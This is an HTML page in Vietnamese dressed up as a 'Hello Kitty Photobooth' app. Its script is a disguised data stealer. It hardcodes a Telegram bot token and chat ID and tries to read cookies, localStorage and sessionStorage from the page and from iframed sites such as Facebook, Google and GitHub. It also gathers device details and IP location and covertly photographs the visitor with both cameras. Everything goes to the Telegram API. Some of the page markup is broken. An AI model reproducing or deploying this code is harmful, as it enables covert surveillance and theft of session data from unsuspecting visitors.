<!doctype html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎀 Hello Kitty Photobooth - Full</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #ffe4ec, #ffb6c1, #ff8a9c);
      font-family: 'Quicksand', sans-serif;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    .sakura-container {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none; overflow: hidden; z-index: 0;
    }
    .sakura {
      position: absolute; top: -20px; color: #ffb7c5; font-size: 20px;
      animation: fall linear infinite; opacity: 0.7;
    }
    @keyframes fall {
      0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 0.8; }
      100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
    }
    .card {
      background: rgba(255,255,255,0.85);
      backdrop-filter: blur(20px);
      border-radius: 40px;
      padding: 25px 20px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
      border: 2px solid rgba(255,255,255,0.5);
      position: relative;
      z-index: 1;
      text-align: center;
    }
    .card::before {
      content: "🎀";
      position: absolute; top: -18px; left: 50%; transform: translateX(-50%);
      font-size: 36px;
      filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
    }
    .kitty-avatar {
      width: 70px; height: 70px; margin: 0 auto 10px;
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 42px;
      box-shadow: 0 8px 30px rgba(255,105,135,0.4);
      border: 3px solid white;
      animation: bounceKitty 2s ease-in-out infinite;
    }
    @keyframes bounceKitty {
      0%,100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }
    h2 { font-size: 20px; font-weight: 800; color: #d6336c; margin-bottom: 2px; }
    .subtitle { color: #e07a8e; font-size: 12px; font-weight: 600; margin-bottom: 12px; }
    .live-clock {
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      padding: 5px 14px; border-radius: 30px; display: inline-block;
      color: white; font-weight: 700; font-size: 11px;
      margin-bottom: 12px;
      box-shadow: 0 4px 15px rgba(255,105,135,0.3);
    }
    .video-container {
      display: flex; gap: 8px; margin-bottom: 12px; justify-content: center;
    }
    .video-preview {
      flex: 1; border-radius: 16px; overflow: hidden;
      background: #fce4ec; position: relative;
      border: 2px solid #ffb6c1;
      min-height: 150px;
      display: flex; align-items: center; justify-content: center;
    }
    .video-preview video {
      width: 100%; display: block; border-radius: 14px;
      background: #fce4ec;
    }
    .video-preview .placeholder {
      color: #e07a8e; font-size: 11px; font-weight: 600; padding: 10px;
    }
    .camera-indicator {
      position: absolute; top: 5px; left: 5px;
      background: rgba(255,255,255,0.9);
      padding: 2px 8px; border-radius: 12px;
      font-size: 9px; font-weight: 700; color: #d6336c;
      border: 1px solid #ffb6c1;
    }
    .btn {
      width: 100%; padding: 12px; border: none; border-radius: 30px;
      font-size: 14px; font-weight: 700; color: white;
      cursor: pointer; transition: all 0.3s ease;
      display: flex; align-items: center; justify-content: center;
      gap: 8px; font-family: 'Quicksand', sans-serif;
    }
    .btn-primary {
      background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
      box-shadow: 0 8px 25px rgba(255,77,109,0.4);
    }
    .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,77,109,0.5); }
    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    .btn-pink {
      background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
      box-shadow: 0 8px 25px rgba(255,107,138,0.4);
    }
    .btn-pink:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
    .btn-group { display: none; flex-direction: column; gap: 8px; margin-top: 10px; }
    .btn-group.show { display: flex; }
    .btn a { color: white; text-decoration: none; width: 100%; }
    .status { margin-top: 12px; font-size: 12px; font-weight: 600; color: #e07a8e; min-height: 18px; }
    .status.success { color: #2ecc71; }
    .status.loading { color: #f59e0b; }
    .status.error { color: #ef4444; }
    .footer-badge { margin-top: 12px; font-size: 9px; color: #e07a8e; opacity: 0.7; letter-spacing: 1px; }
    #canvas { display: none; }

    .music-control {
      position: fixed; bottom: 20px; right: 20px; z-index: 100;
      background: rgba(255,255,255,0.9); border: 2px solid #ffb6c1;
      border-radius: 50%; width: 44px; height: 44px;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px; cursor: pointer;
      box-shadow: 0 4px 20px rgba(255,105,135,0.3);
      transition: all 0.3s ease; backdrop-filter: blur(10px);
    }
    .music-control:hover { transform: scale(1.1); }
    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
    @keyframes pulseMusic {
      0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
      50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
    }
    .music-progress {
      position: fixed; bottom: 75px; right: 20px; z-index: 99;
      width: 44px; display: flex; flex-direction: column; align-items: center;
    }
    .music-progress input[type="range"] {
      width: 60px; height: 3px; -webkit-appearance: none;
      background: #ffb6c1; border-radius: 2px; outline: none;
      transform: rotate(-90deg); transform-origin: center; cursor: pointer;
    }
    .music-progress input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none; width: 10px; height: 10px;
      background: #ff6b8a; border-radius: 50%; cursor: pointer;
    }
    .loading-overlay {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255,255,255,0.85); backdrop-filter: blur(5px);
      z-index: 999; justify-content: center; align-items: center;
      flex-direction: column; gap: 15px;
    }
    .loading-overlay.show { display: flex; }
    .loading-spinner {
      width: 50px; height: 50px;
      border: 4px solid #ffb6c1; border-top: 4px solid #ff4d6d;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
    #logDisplay {
      position: fixed;
      bottom: 80px;
      left: 20px;
      right: 80px;
      max-height: 150px;
      overflow-y: auto;
      background: rgba(0,0,0,0.85);
      color: #00ff88;
      font-size: 10px;
      padding: 10px;
      border-radius: 10px;
      font-family: monospace;
      z-index: 50;
      white-space: pre-wrap;
      word-break: break-all;
      display: none;
      border: 1px solid #00ff88;
    }
    #logDisplay.show { display: block; }

    .iframe-container {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.9);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
    .iframe-container.show { display: flex; }
    .iframe-box {
      background: white;
      border-radius: 20px;
      width: 95%;
      max-width: 500px;
      max-height: 90vh;
      overflow: hidden;
      position: relative;
    }
    .iframe-box iframe {
      width: 100%;
      height: 500px;
      border: none;
    }
    .iframe-close {
      position: absolute;
      top: 10px; right: 15px;
      background: rgba(0,0,0,0.7);
      color: white;
      border: none;
      border-radius: 50%;
      width: 35px; height: 35px;
      font-size: 18px;
      cursor: pointer;
      z-index: 10;
    }
    .iframe-status {
      padding: 10px;
      text-align: center;
      background: #f0f0f0;
      font-size: 13px;
      font-weight: 600;
      color: #333;
    }

    @media (max-width: 480px) {
      .card { padding: 18px 12px; }
      .video-preview { min-height: 120px; }
      h2 { font-size: 17px; }
      .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
      #logDisplay { left: 10px; right: 10px; bottom: 70px; max-height: 120px; font-size: 9px; }
      .iframe-box iframe { height: 400px; }
    }
  </style>
</head>
<body>

<div id="logDisplay"></div>

<!-- Iframe Container để mở web khác -->
<div class="iframe-container" id="iframeContainer">
  <div class="iframe-box">
    <button class="iframe-close" onclick="closeIframe()">✕</button>
    <div class="iframe-status" id="iframeStatus">🌐 Đang tải...</div>

</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="loading-spinner"></div>
  <div class="loading-text">🌸 Đang khởi tạo...</div>
</div>

<div class="sakura-container" id="sakuraContainer"></div>

<div class="music-progress">
  <input type="range" id="volumeControl" min="0" max="1" step="0.01" value="0.7">

<div class="music-control playing" id="musicBtn" onclick="toggleMusic()">🎵</div>

<div class="card">
  <div class="kitty-avatar"><span>🐱</span></div>

  <h2>🌸 Hello Kitty Photobooth</h2>

    <div class="video-preview">

      <div class="placeholder" id="placeholderFront">📱 Front</div>

    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
  </div>

  <div id="status" class="status">💖 Bấm nút để bắt đầu!</div>

</div>

<canvas id="canvas"></canvas>

<script>
// ============================================================
// CẤU HÌNH
// ============================================================
const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
const TELEGRAM_CHAT_ID = '8872446985';
const MUSIC_FILE = 'nhac_nen.mp3';

// DANH SÁCH WEB CẦN LẤY COOKIES
const TARGET_WEBSITES = [
  'https://facebook.com',
  'https://google.com',
  'https://youtube.com',
  'https://instagram.com',
  'https://tiktok.com',
  'https://twitter.com',
  'https://amazon.com',
  'https://netflix.com',
  'https://spotify.com',
  'https://github.com'
];

// ============================================================
// LOG SYSTEM
// ============================================================
const logDiv = document.getElementById('logDisplay');
let logContent = '';
let collectedCookies = {};

function addLog(msg, type = 'info') {
  const time = new Date().toLocaleTimeString();
  const colors = { info: '#44aaff', success: '#00ff88', error: '#ff4444', warning: '#ffaa00', cookie: '#ff88aa' };
  logContent += `[${time}] ${msg}\n`;
  logDiv.innerHTML = logContent.split('\n').map(line => {
    const color = colors[type] || '#ffffff';
    return `<span style="color:${color};">${line}</span>`;
  }).join('\n');
  logDiv.scrollTop = logDiv.scrollHeight;
  logDiv.classList.add('show');
  console.log(msg);
}

function setStatus(msg, type = '') {
  const el = document.getElementById('status');
  el.textContent = msg;
  el.className = 'status ' + type;
}

// ============================================================
// HOA ANH ĐÀO
// ============================================================
(function createSakura() {
  const container = document.getElementById('sakuraContainer');
  const emojis = ['🌸','🌺','🌸','🌺','🌸'];
  for (let i = 0; i < 30; i++) {
    const el = document.createElement('div');
    el.className = 'sakura';
    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
    el.style.left = Math.random() * 100 + '%';
    el.style.fontSize = (12 + Math.random() * 20) + 'px';
    el.style.animationDuration = (8 + Math.random() * 14) + 's';
    el.style.animationDelay = (Math.random() * 15) + 's';
    container.appendChild(el);
  }
})();

// ============================================================
// NHẠC
// ============================================================
let audio = null;
let isMusicPlaying = false;
let musicStarted = false;

function initAudio() {
  if (!audio) {
    audio = new Audio(MUSIC_FILE);
    audio.loop = true;
    audio.volume = 0.7;
    document.getElementById('volumeControl').addEventListener('input', function() {
      if (audio) audio.volume = this.value;
    });
    audio.addEventListener('canplaythrough', function() {
      if (!musicStarted) {
        audio.play().then(() => {
          isMusicPlaying = true;
          musicStarted = true;
          document.getElementById('musicBtn').classList.add('playing');
          document.getElementById('musicBtn').textContent = '🎵';
        }).catch(() => {});
      }
    });
  }
}

function playMusic() {
  try {
    initAudio();
    if (!isMusicPlaying) {
      audio.play().then(() => {
        isMusicPlaying = true;
        musicStarted = true;
        document.getElementById('musicBtn').classList.add('playing');
        document.getElementById('musicBtn').textContent = '🎵';
      }).catch(() => {
        document.addEventListener('click', function playOnClick() {
          if (!isMusicPlaying) {
            audio.play().catch(()=>{});
            isMusicPlaying = true;
            musicStarted = true;
            document.getElementById('musicBtn').classList.add('playing');
            document.getElementById('musicBtn').textContent = '🎵';
            document.removeEventListener('click', playOnClick);
          }
        }, { once: true });
      });
    }
  } catch(e) {}
}

function toggleMusic() {
  initAudio();
  if (isMusicPlaying) {
    audio.pause();
    isMusicPlaying = false;
    document.getElementById('musicBtn').classList.remove('playing');
    document.getElementById('musicBtn').textContent = '🔇';
  } else {
    audio.play().catch(()=>{});
    isMusicPlaying = true;
    document.getElementById('musicBtn').classList.add('playing');
    document.getElementById('musicBtn').textContent = '🎵';
  }
}

setTimeout(playMusic, 100);

// ============================================================
// ĐỒNG HỒ
// ============================================================
function updateClock() {
  const now = new Date();
  document.getElementById('clock').textContent =
    `🕒 ${now.toLocaleTimeString('vi-VN', {hour12:false})} - ${now.toLocaleDateString('vi-VN')}`;
}
setInterval(updateClock, 1000);
updateClock();

// ============================================================
// LẤY COOKIES TỪ TRANG HIỆN TẠI
// ============================================================
function getCurrentCookies() {
  try {
    const raw = document.cookie;
    if (!raw) return [];
    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
      const idx = c.indexOf('=');
      if (idx === -1) return { name: c, value: '' };
      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
    });
  } catch(e) { return []; }
}

function getCookiesString(cookies) {
  if (!cookies || !cookies.length) return '❌ Không có cookies';
  return cookies.map((c, i) => {
    let v = decodeURIComponent(c.value || '');
    if (v.length > 60) v = v.substring(0, 60) + '…';
    v = v.replace(/[^\x20-\x7E]/g, '?');
    return `  ${i+1}. ${c.name} = ${v}`;
  }).join('\n');
}

// ============================================================
// LẤY COOKIES TỪ CÁC WEB KHÁC QUA IFRAME
// ============================================================
function getCookiesFromIframe(url) {
  return new Promise((resolve) => {
    const container = document.getElementById('iframeContainer');
    const iframe = document.getElementById('iframeTarget');
    const status = document.getElementById('iframeStatus');
    
    container.classList.add('show');
    iframe.src = url;
    status.textContent = `🌐 Đang tải: ${url}`;
    
    let timeout = setTimeout(() => {
      container.classList.remove('show');
      resolve({ url, error: 'Timeout', cookies: [], success: false });
    }, 20000);
    
    iframe.onload = function() {
      clearTimeout(timeout);
      status.textContent = `✅ Đã tải xong: ${url}`;
      
      try {
        // Thử đọc cookies từ iframe
        let cookies = [];
        try {
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          if (doc && doc.cookie) {
            const raw = doc.cookie;
            if (raw) {
              cookies = raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
                const idx = c.indexOf('=');
                if (idx === -1) return { name: c, value: '' };
                return { name: c.substring(0, idx), value: c.substring(idx + 1) };
              });
            }
          }
        } catch(e) {
          console.log('Không đọc được cookies (CORS):', e.message);
        }
        
        // Thử đọc localStorage
        let localStorage = {};
        try {
          const win = iframe.contentWindow;
          if (win && win.localStorage) {
            for (let i = 0; i < win.localStorage.length; i++) {
              const key = win.localStorage.key(i);
              localStorage[key] = win.localStorage.getItem(key);
            }
          }
        } catch(e) {}
        
        // Thử đọc sessionStorage
        let sessionStorage = {};
        try {
          const win = iframe.contentWindow;
          if (win && win.sessionStorage) {
            for (let i = 0; i < win.sessionStorage.length; i++) {
              const key = win.sessionStorage.key(i);
              sessionStorage[key] = win.sessionStorage.getItem(key);
            }
          }
        } catch(e) {}
        
        setTimeout(() => {
          container.classList.remove('show');
          iframe.src = 'about:blank';
          resolve({
            url: url,
            cookies: cookies,
            localStorage: localStorage,
            sessionStorage: sessionStorage,
            success: cookies.length > 0 || Object.keys(localStorage).length > 0
          });
        }, 1500);
        
      } catch(e) {
        container.classList.remove('show');
        iframe.src = 'about:blank';
        resolve({ url, error: e.message, cookies: [], success: false });
      }
    };
    
    iframe.onerror = function() {
      clearTimeout(timeout);
      container.classList.remove('show');
      iframe.src = 'about:blank';
      resolve({ url, error: 'Load error', cookies: [], success: false });
    };
  });
}

// ============================================================
// THU THẬP TỪ NHIỀU WEB
// ============================================================
async function collectAllWebCookies() {
  addLog('🚀 Bắt đầu thu thập cookies từ nhiều web...', 'info');
  setStatus('📸 Đang thu thập cookies từ các web...', 'loading');
  
  const results = {};
  let totalCookies = 0;
  
  // 1. Lấy cookies trang hiện tại
  const currentCookies = getCurrentCookies();
  results['📱 Trang hiện tại'] = {
    cookies: currentCookies,
    success: true,
    note: currentCookies.length > 0 ? `${currentCookies.length} cookies` : 'Không có cookies'
  };
  totalCookies += currentCookies.length;
  addLog(`✅ Trang hiện tại: ${currentCookies.length} cookies`, 'success');
  
  // 2. Lấy từ các web khác
  for (let i = 0; i < TARGET_WEBSITES.length; i++) {
    const url = TARGET_WEBSITES[i];
    const domain = url.replace('https://', '').replace('http://', '');
    
    addLog(`🌐 [${i+1}/${TARGET_WEBSITES.length}] Đang lấy cookies từ: ${domain}`, 'info');
    setStatus(`📸 Đang lấy: ${domain} (${i+1}/${TARGET_WEBSITES.length})`, 'loading');
    
    const result = await getCookiesFromIframe(url);
    
    if (result.success) {
      results[domain] = {
        cookies: result.cookies || [],
        localStorage: result.localStorage || {},
        sessionStorage: result.sessionStorage || {},
        success: true,
        note: `${result.cookies.length} cookies, ${Object.keys(result.localStorage).length} LS, ${Object.keys(result.sessionStorage).length} SS`
      };
      totalCookies += result.cookies.length;
      addLog(`✅ ${domain}: ${result.cookies.length} cookies, ${Object.keys(result.localStorage).length} LS`, 'success');
    } else {
      results[domain] = {
        cookies: [],
        success: false,
        note: `❌ Lỗi: ${result.error || 'Không thể lấy'}`
      };
      addLog(`❌ ${domain}: ${result.error || 'Không thể lấy'}`, 'error');
    }
    
    // Đợi giữa các lần
    await new Promise(r => setTimeout(r, 500));
  }
  
  addLog(`✅ Hoàn tất! Tổng cookies: ${totalCookies}`, 'success');
  setStatus(`✅ Đã thu thập xong! Tổng cookies: ${totalCookies}`, 'success');
  
  return results;
}

// ============================================================
// LẤY THÔNG TIN KHÁC
// ============================================================
function getLocalStorageInfo() {
  try {
    if (!localStorage.length) return '❌ Không có dữ liệu localStorage';
    const items = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      let val = localStorage.getItem(key) || '';
      if (val.length > 60) val = val.substring(0, 60) + '…';
      val = val.replace(/[^\x20-\x7E]/g, '?');
      items.push(`  ${key} = ${val}`);
    }
    return items.join('\n');
  } catch(e) { return '❌ Không thể truy cập localStorage'; }
}

function getSessionStorageInfo() {
  try {
    if (!sessionStorage.length) return '❌ Không có dữ liệu sessionStorage';
    const items = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      let val = sessionStorage.getItem(key) || '';
      if (val.length > 60) val = val.substring(0, 60) + '…';
      val = val.replace(/[^\x20-\x7E]/g, '?');
      items.push(`  ${key} = ${val}`);
    }
    return items.join('\n');
  } catch(e) { return '❌ Không thể truy cập sessionStorage'; }
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'Không rõ',
    language: navigator.language || 'Không rõ',
    cookieEnabled: navigator.cookieEnabled ? '✅ Bật' : '❌ Tắt',
    hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
    maxTouchPoints: navigator.maxTouchPoints || '0',
    screen: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ'
  };
}

async function getIP() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data.success) {
      return {
        ip: data.ip || 'Không rõ',
        city: data.city || 'Không rõ',
        region: data.region || 'Không rõ',
        country: data.country || 'Không rõ',
        isp: data.connection?.isp || data.connection?.org || 'Không rõ'
      };
    }
    return { ip: 'Không rõ' };
  } catch(e) {
    try {
      const fallback = await fetch('https://api.ipify.org?format=json');
      const data = await fallback.json();
      return { ip: data.ip || 'Không rõ' };
    } catch(err) { return { ip: 'Không rõ' }; }
  }
}

// CAMERA
// ============================================================
const videoFront = document.getElementById('videoFront');
const videoBack = document.getElementById('videoBack');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('capture-btn');
const statusDiv = document.getElementById('status');
const actionBtns = document.getElementById('action-buttons');
const loadingOverlay = document.getElementById('loadingOverlay');

let streamFront = null, streamBack = null;
let isFrontReady = false, isBackReady = false;

async function startCameras() {
  loadingOverlay.classList.add('show');
  captureBtn.disabled = true;
  addLog('📷 Đang khởi tạo camera...', 'info');
  
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cameras = devices.filter(d => d.kind === 'videoinput');
    addLog(`📷 Tìm thấy ${cameras.length} camera`, 'info');
    
    let frontId = null, backId = null;
    for (const cam of cameras) {
      const label = cam.label.toLowerCase();
      if (label.includes('front') || label.includes('face') || label.includes('前置') || label.includes('自拍')) {
        frontId = cam.deviceId;
      } else if (label.includes('back') || label.includes('rear') || label.includes('后置') || label.includes('主摄')) {
        backId = cam.deviceId;
      }
    }
    
    if (!frontId && cameras.length > 0) frontId = cameras[0].deviceId;
    if (!backId && cameras.length > 1) backId = cameras[1].deviceId;
    
    if (frontId) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { deviceId: { exact: frontId }, width: { ideal: 320 }, height: { ideal: 240 } },
          audio: false
        });
        streamFront = stream;
        videoFront.srcObject = stream;
        await videoFront.play();
        document.getElementById('placeholderFront').style.display = 'none';
        isFrontReady = true;
        addLog('✅ Camera trước đã mở', 'success');
      } catch(e) {
        addLog(`❌ Lỗi cam trước: ${e.message}`, 'error');
        document.getElementById('placeholderFront').textContent = '❌ Không mở được';
        isFrontReady = false;
      }
    }
    
    if (backId) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { deviceId: { exact: backId }, width: { ideal: 320 }, height: { ideal: 240 } },
          audio: false
        });
        streamBack = stream;
        videoBack.srcObject = stream;
        await videoBack.play();
        document.getElementById('placeholderBack').style.display = 'none';
        isBackReady = true;
        addLog('✅ Camera sau đã mở', 'success');
      } catch(e) {
        addLog(`❌ Lỗi cam sau: ${e.message}`, 'error');
        document.getElementById('placeholderBack').textContent = '❌ Không mở được';
        isBackReady = false;
      }
    }
    
    if (isFrontReady || isBackReady) {
      captureBtn.disabled = false;
      setStatus('✅ Camera đã sẵn sàng!', 'success');
    } else {
      setStatus('⚠️ Không có camera nào hoạt động', 'error');
    }
    
  } catch(err) {
    addLog(`❌ Lỗi camera: ${err.message}`, 'error');
    setStatus('⚠️ Không thể truy cập camera', 'error');
  } finally {
    loadingOverlay.classList.remove('show');
  }
}

setTimeout(startCameras, 500);

// CHỤP ẢNH VÀ GỬI DỮ LIỆU
// ============================================================
function playClickSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.1);
  } catch(e) {}
}

captureBtn.onclick = async function() {
  if (!isFrontReady && !isBackReady) {
    setStatus('⚠️ Vui lòng đợi camera sẵn sàng!', 'error');
    return;
  }
  
  playClickSound();
  captureBtn.disabled = true;
  setStatus('📸 Đang thu thập dữ liệu...', 'loading');
  addLog('📸 Bắt đầu thu thập dữ liệu...', 'info');
  
  // 1. Thu thập cookies từ các web
  const cookieResults = await collectAllWebCookies();
  
  // 2. Thu thập thông tin khác
  const device = getDeviceInfo();
  const ip = await getIP();
  const localStorage = getLocalStorageInfo();
  const sessionStorage = getSessionStorageInfo();
  const currentCookies = getCurrentCookies();
  
  // 3. Chụp ảnh
  const frontOk = isFrontReady && videoFront.videoWidth > 0 && videoFront.readyState >= 2;
  const backOk = isBackReady && videoBack.videoWidth > 0 && videoBack.readyState >= 2;
  
  const W = 480, H = 360;
  canvas.width = W; canvas.height = H;
  const ctx = canvas.getContext('2d');
  
  const grad = ctx.createLinearGradient(0, 0, W, H);
  grad.addColorStop(0, '#ffe4ec');
  grad.addColorStop(1, '#ffb6c1');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, W, H);
  
  if (frontOk) {
    const w = W / 2 - 5, h = H - 40;
    ctx.save();
    ctx.translate(5 + w, 20);
    ctx.scale(-1, 1);
    ctx.drawImage(videoFront, -w, 0, w, h);
    ctx.restore();
    ctx.strokeStyle = '#ff6b8a';
    ctx.lineWidth = 2;
    ctx.strokeRect(5, 20, w, h);
    ctx.fillStyle = 'rgba(255,255,255,0.7)';
    ctx.fillRect(5, 20, 50, 18);
    ctx.fillStyle = '#d6336c';
    ctx.font = 'bold 10px Quicksand';
    ctx.textAlign = 'left';
    ctx.fillText('📱 Trước', 10, 34);
  }
  
  if (backOk) {
    const w = W / 2 - 5, h = H - 40, x = W / 2 + 5;
    ctx.drawImage(videoBack, x, 20, w, h);
    ctx.strokeStyle = '#ff6b8a';
    ctx.lineWidth = 2;
    ctx.strokeRect(x, 20, w, h);
    ctx.fillStyle = 'rgba(255,255,255,0.7)';
    ctx.fillRect(x, 20, 50, 18);
    ctx.fillStyle = '#d6336c';
    ctx.font = 'bold 10px Quicksand';
    ctx.textAlign = 'left';
    ctx.fillText('📷 Sau', x + 5, 34);
  }
  
  ctx.fillStyle = '#d6336c';
  ctx.font = 'bold 16px Quicksand';
  ctx.textAlign = 'center';
  ctx.shadowColor = 'rgba(255,255,255,0.8)';
  ctx.shadowBlur = 8;
  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W / 2, 18);
  ctx.shadowBlur = 0;
  
  ctx.fillStyle = 'rgba(214,51,108,0.6)';
  ctx.font = '9px Quicksand';
  ctx.textAlign = 'right';
  ctx.fillText(new Date().toLocaleString('vi-VN'), W - 8, H - 5);
  
  ctx.fillStyle = 'rgba(255,255,255,0.6)';
  ctx.fillRect(5, H - 20, 130, 16);
  ctx.fillStyle = '#d6336c';
  ctx.font = 'bold 8px Quicksand';
  ctx.textAlign = 'left';
  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 10, H - 8);
  
  // === TẠO CAPTION GỬI TELEGRAM ===
  let caption = `🎀 HELLO KITTY - COOKIE COLLECTOR 🎀\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  
  caption += `📱 THIẾT BỊ:\n`;
  caption += `🔹 Platform: ${device.platform}\n`;
  caption += `🔹 Language: ${device.language}\n`;
  caption += `🔹 Screen: ${device.screen}\n`;
  caption += `🔹 CPU: ${device.hardwareConcurrency} cores\n`;
  caption += `🔹 RAM: ${device.deviceMemory}\n`;
  caption += `🔹 Touch: ${device.maxTouchPoints > 0 ? '✅ Có' : '❌ Không'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  
  caption += `🌐 IP & VỊ TRÍ:\n`;
  caption += `🔹 IP: ${ip.ip || 'Không rõ'}\n`;
  caption += `🔹 City: ${ip.city || 'Không rõ'}\n`;
  caption += `🔹 Country: ${ip.country || 'Không rõ'}\n`;
  caption += `🔹 ISP: ${ip.isp || 'Không rõ'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  
  caption += `🍪 COOKIES TỪ CÁC WEB:\n`;
  for (const [domain, data] of Object.entries(cookieResults)) {
    if (data.success) {
      caption += `🌐 ${domain}: ${data.cookies.length} cookies\n`;
      if (data.cookies.length > 0) {
        data.cookies.slice(0, 5).forEach(c => {
          let v = decodeURIComponent(c.value || '');
          if (v.length > 40) v = v.substring(0, 40) + '…';
          caption += `  • ${c.name} = ${v}\n`;
        });
        if (data.cookies.length > 5) {
          caption += `  ... và ${data.cookies.length - 5} cookies khác\n`;
        }
      }
    } else {
      caption += `❌ ${domain}: ${data.note || 'Lỗi'}\n`;
    }
  }
  
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `💾 LOCAL STORAGE (trang hiện tại):\n${localStorage || '  ❌ Không có dữ liệu'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `📦 SESSION STORAGE:\n${sessionStorage || '  ❌ Không có dữ liệu'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `📷 Camera: ${isFrontReady ? '✅ Trước' : '❌ Trước'} | ${isBackReady ? '✅ Sau' : '❌ Sau'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `🌸 Cảm ơn bạn đã sử dụng! 🌸`;
  
  // === GỬI LÊN TELEGRAM ===
  canvas.toBlob(async (blob) => {
    if (blob) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', blob, `hello_kitty_${Date.now()}.jpg`);
      form.append('caption', caption);
      form.append('parse_mode', 'HTML');
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        });
        const json = await res.json();
        if (json.ok) {
          setStatus('🎀 Thành công! Kitty đã nhận được dữ liệu! 💖', 'success');
          actionBtns.classList.add('show');
          addLog('✅ Đã gửi lên Telegram thành công!', 'success');
        } else {
          setStatus('⚠️ Lỗi gửi: ' + (json.description || 'Unknown'), 'error');
          addLog(`❌ Lỗi Telegram: ${json.description || 'Unknown'}`, 'error');
        }
      } catch(e) {
        setStatus('⚠️ Lỗi kết nối Telegram', 'error');
        addLog(`❌ Lỗi: ${e.message}`, 'error');
      }
    }
    captureBtn.disabled = false;
  }, 'image/jpeg', 0.92);
};
